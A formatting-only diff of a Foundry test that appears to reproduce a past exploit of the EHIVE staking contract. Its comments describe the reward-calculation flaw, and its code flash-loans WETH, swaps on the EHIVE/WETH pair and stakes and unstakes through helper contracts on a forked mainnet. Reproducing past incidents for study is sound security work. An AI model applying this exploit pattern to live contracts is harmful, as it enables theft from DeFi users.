@@ -13,8 +13,8 @@ import "./interface.sol";
 
 // @Analysis
 // https://twitter.com/bulu4477/status/1693636187485872583
-// In the EHIVE contract, the function stake() incorrectly updates the 'staked' value before calculating 'earned' 
-// As a result, an attacker only needs to initially stake 0 value of EHIVE, wait for a period of time, 
+// In the EHIVE contract, the function stake() incorrectly updates the 'staked' value before calculating 'earned'
+// As a result, an attacker only needs to initially stake 0 value of EHIVE, wait for a period of time,
 // and then stake a certain amount of EHIVE to earn a large amount of EHIVE. Subsequently, they can unstake and sell it for profit
 // @Vulnerability code
 // //Check user is registered as staker
@@ -39,19 +39,15 @@ interface IUnstake {
 }
 
 contract EHIVETest is Test {
-    IERC20 private constant WETH =
-        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    IEHIVE private constant EHIVE =
-        IEHIVE(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd);
-    IAaveFlashloan private constant AaveFlashloan =
-        IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
-    IUniswapV2Pair private constant EHIVE_WETH =
-        IUniswapV2Pair(0xAE851769593AC6048D36BC123700649827659A82);
+    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IEHIVE private constant EHIVE = IEHIVE(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd);
+    IAaveFlashloan private constant AaveFlashloan = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
+    IUniswapV2Pair private constant EHIVE_WETH = IUniswapV2Pair(0xAE851769593AC6048D36BC123700649827659A82);
     address[28] public contractList;
 
     function setUp() public {
         // Start from the block when exploit contracts were deployed
-        vm.createSelectFork("mainnet", 17690497);
+        vm.createSelectFork("mainnet", 17_690_497);
         vm.label(address(WETH), "WETH");
         vm.label(address(EHIVE), "EHIVE");
         vm.label(address(AaveFlashloan), "AaveFlashloan");
@@ -69,22 +65,12 @@ contract EHIVETest is Test {
         // Jump to the time when attack was happen
         vm.warp(block.timestamp + 38 days);
         emit log_named_decimal_uint(
-            "Attacker WETH balance before attack",
-            WETH.balanceOf(address(this)),
-            WETH.decimals()
+            "Attacker WETH balance before attack", WETH.balanceOf(address(this)), WETH.decimals()
         );
         WETH.approve(address(AaveFlashloan), type(uint256).max);
-        AaveFlashloan.flashLoanSimple(
-            address(this),
-            address(WETH),
-            18e18,
-            new bytes(1),
-            0
-        );
+        AaveFlashloan.flashLoanSimple(address(this), address(WETH), 18e18, new bytes(1), 0);
         emit log_named_decimal_uint(
-            "Attacker WETH balance after attack",
-            WETH.balanceOf(address(this)),
-            WETH.decimals()
+            "Attacker WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals()
         );
     }
 
@@ -108,35 +94,21 @@ contract EHIVETest is Test {
     }
 
     function WETHToEHIVE() internal {
-        (uint112 reserveEHIVE, uint112 reserveWETH, ) = EHIVE_WETH
-            .getReserves();
-        uint256 amount0Out = calcAmount(
-            reserveEHIVE,
-            reserveWETH,
-            WETH.balanceOf(address(this))
-        );
+        (uint112 reserveEHIVE, uint112 reserveWETH,) = EHIVE_WETH.getReserves();
+        uint256 amount0Out = calcAmount(reserveEHIVE, reserveWETH, WETH.balanceOf(address(this)));
 
         WETH.transfer(address(EHIVE_WETH), WETH.balanceOf(address(this)));
         EHIVE_WETH.swap(amount0Out, 0, address(this), bytes(""));
     }
 
     function EHIVEToWETH() internal {
-        (uint112 reserveEHIVE, uint112 reserveWETH, ) = EHIVE_WETH
-            .getReserves();
+        (uint112 reserveEHIVE, uint112 reserveWETH,) = EHIVE_WETH.getReserves();
         EHIVE.transfer(address(EHIVE_WETH), EHIVE.balanceOf(address(this)));
-        uint256 amount1Out = calcAmount(
-            reserveWETH,
-            reserveEHIVE,
-            EHIVE.balanceOf(address(EHIVE_WETH)) - reserveEHIVE
-        );
+        uint256 amount1Out = calcAmount(reserveWETH, reserveEHIVE, EHIVE.balanceOf(address(EHIVE_WETH)) - reserveEHIVE);
         EHIVE_WETH.swap(0, amount1Out - 100, address(this), bytes(""));
     }
 
-    function calcAmount(
-        uint256 reserve1,
-        uint256 reserve2,
-        uint256 balance
-    ) internal returns (uint256) {
+    function calcAmount(uint256 reserve1, uint256 reserve2, uint256 balance) internal returns (uint256) {
         uint256 a = (balance * 997);
         uint256 b = a * reserve1;
         uint256 c = (reserve2 * 1000) + a;
@@ -145,8 +117,7 @@ contract EHIVETest is Test {
 }
 
 contract UnstakeContract is Test {
-    IEHIVE private constant EHIVE =
-        IEHIVE(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd);
+    IEHIVE private constant EHIVE = IEHIVE(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd);
 
     function stake(uint256 amount) external {
         EHIVE.stake(amount, 0);
